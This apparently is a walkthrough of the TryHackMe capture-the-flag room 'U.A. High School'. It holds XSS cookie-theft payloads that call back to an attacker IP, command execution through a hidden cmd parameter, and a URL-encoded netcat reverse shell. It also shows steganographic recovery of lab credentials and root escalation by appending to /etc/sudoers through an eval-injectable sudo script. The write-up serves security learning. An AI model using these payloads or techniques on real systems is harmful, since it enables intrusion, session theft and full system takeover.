---

Name: U.A. High School
Difficulty: Easy
URL: https://tryhackme.com/room/yueiua
Description: Welcome to the web application of U.A., the Superhero Academy.

---


## Enumeration

I started with a full TCP port scan using RustScan:

```bash
$ rustscan -a ua.thm -r 1-65535 --ulimit 5000 -- -sC -sV

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two services were exposed:

* **22/tcp** — SSH
* **80/tcp** — HTTP

I moved on to enumerating the web server.

### Directory enumeration

```bash
$ gobuster dir -url http://ua.thm/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -t 100 -x txt,php,html,bak,zip,log,old,js -k
```

Some interesting pages were discovered:

```text
index.html
contact.html
about.html
assets/
courses.html
admissions.html
```

The `contact.html` page contains a form, so I tested it for XSS.

I tried several payloads, including:

```html
<script>new Image().src='http://192.168.129.192:4444/?c='+encodeURIComponent(document.cookie)</script>
```

```html
<img src=x onerror="new Image().src='http://192.168.129.192:4444/?d='+encodeURIComponent(document.cookie)">
```

```html
"><img src=x onerror="new Image().src='http://192.168.129.192:4444/?c='+encodeURIComponent(document.cookie)">
```

None of these resulted in an XSS callback.

The form sends a POST request to `/contact.html`:

```http
POST /contact.html HTTP/1.1
Host: ua.thm
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=a44lckqpcdi0ps0v538g2d7j82

name=a&email=v%40gmail.com&subject=as&message=sa%0D%0A
```

I also found the email address:

```text
info@yuei.ac.jp
```

The PHP session cookie was not marked `HttpOnly`, but I couldn't find a working XSS vulnerability to exploit it.

### Subdomain enumeration

I also checked for subdomains:

```bash
$ ffuf \
  -u http://ua.thm/ \
  -H 'Host: FUZZ.ua.thm' \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 1988 \
  -t 100
```

No interesting subdomains were found.

---

## Command Injection

The `assets` directory looked interesting, so I enumerated it further:

```bash
$ gobuster dir -url http://ua.thm/assets \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -t 100 -x txt,php,html,bak,zip,log,old,js -k
```

This revealed:

```text
index.php            (Status: 200) [Size: 0]
images/              (Status: 301)
```

`index.php` returned an empty page, so I fuzzed for parameters.

```bash
$ ffuf \
  -u 'http://ua.thm/assets/index.php?FUZZ=id' \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs 0
```

The parameter `cmd` stood out:

```text
cmd                     [Status: 200, Size: 72]
```

I tested it with:

```text
http://ua.thm/assets/index.php?cmd=id
```

The server returned command output encoded in Base64:

```text
dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
```

Decoding it showed that the command was executed as `www-data`.

This confirmed a **command injection / command execution vulnerability** through the `cmd` parameter.

### Getting a shell

I started a listener:

```bash
nc -lvnp 4444
```

Then I sent a URL-encoded reverse shell:

```text
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.129.192%204444%20%3E%2Ftmp%2Ff
```

This gave me a shell as:

```text
www-data
```

---

## Finding the Next Privilege Escalation Step

While enumerating the system, I found `/opt/NewComponent`:

```bash
www-data@ip-10-112-146-21:/opt/NewComponent$ ls -l

-r-xr-xr-x 1 deku deku 684 Jan 23  2024 feedback.sh
```

The script contained:

```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback

if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi
```

The script attempts to prevent command injection by blacklisting several characters.

However, it passes the input directly to:

```bash
eval "echo $feedback"
```

This is dangerous because `eval` causes the resulting string to be interpreted as shell code.

For example:

```bash
printf 'hello > /tmp/test\n' | /opt/NewComponent/feedback.sh
```

The command successfully created the file:

```bash
$ cat /tmp/test
hello
```

So the blacklist can be bypassed using a redirect.

At this point, the script looked particularly interesting because it might provide a path to privilege escalation.

---

## Finding Credentials

I also found a hidden directory:

```bash
www-data@ip-10-112-146-21:/var/www/Hidden_Content$ cat passphrase.txt

QWxsbWlnaHRGb3JFdmVyISEhCg==
```

The contents were Base64 encoded:

```bash
$ echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d

AllmightForEver!!!
```

Initially, I tried using this as the password for `deku`:

```bash
su deku
```

but it did not work.

I continued enumerating the application files.

---

## Steganography

Inside the web application's image directory I found:

```bash
www-data@ip-10-112-146-21:/var/www/html/assets/images$ ls

oneforall.jpg
yuei.jpg
```

I downloaded `oneforall.jpg`:

```bash
wget http://ua.thm/assets/images/oneforall.jpg
```

The file was corrupted, so I checked its magic bytes:

```bash
$ xxd -l 32 oneforall.jpg

00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406
```

The file actually begins with the PNG magic bytes:

```text
89 50 4E 47
```

despite being named `.jpg`.

I used [MagicBytes](https://github.com/Haxrein/MagicBytes)  to confirm the mismatch:

```bash
python3 magicbytes.py -i oneforall.jpg -m jpg
```

The previously discovered passphrase looked useful for steganography, so I tried it with `steghide`:

```bash
steghide extract -sf oneforall.jpg -p 'AllmightForEver!!!'
```

This extracted:

```text
creds.txt
```

The file contained:

```text
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

I could now switch to `deku`:

```bash
su deku
```

using:

```text
One?For?All_!!one1/A
```

---

## Privilege Escalation

As `deku`, I checked my sudo permissions:

```bash
deku@ip-10-112-137-241:~$ sudo -l

Matching Defaults entries for deku on ip-10-112-137-241:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-112-137-241:
    (ALL) /opt/NewComponent/feedback.sh
```

This is the key to the final privilege escalation: `deku` can execute `feedback.sh` as **root**.

The script attempts to filter command injection by blacklisting characters such as `;`, `&`, `|`, `$()` and others. However, it does **not** block shell redirection operators such as `>>`.

More importantly, the input is passed directly to:

```bash
eval "echo $feedback"
```

Since `eval` evaluates the resulting string as shell syntax, I can abuse the `>>` redirection to write to a file with root privileges.

I initially tried creating a new UID 0 user by modifying `/etc/passwd`:

```bash
openssl passwd -6 password123
```

and then attempted to append a crafted entry to `/etc/passwd`. This worked in principle as an idea, but was more complicated than necessary.

Instead, I could directly modify `/etc/sudoers`.

I ran the script with sudo and supplied:

```text
deku ALL=NOPASSWD: ALL >> /etc/sudoers
```

The `>>` operator causes the line to be appended to `/etc/sudoers`, and because `feedback.sh` is running as root, the file is modified with root privileges.

This gives `deku` unrestricted passwordless sudo access.

I could then simply run:

```bash
sudo su
```

and obtain a root shell.
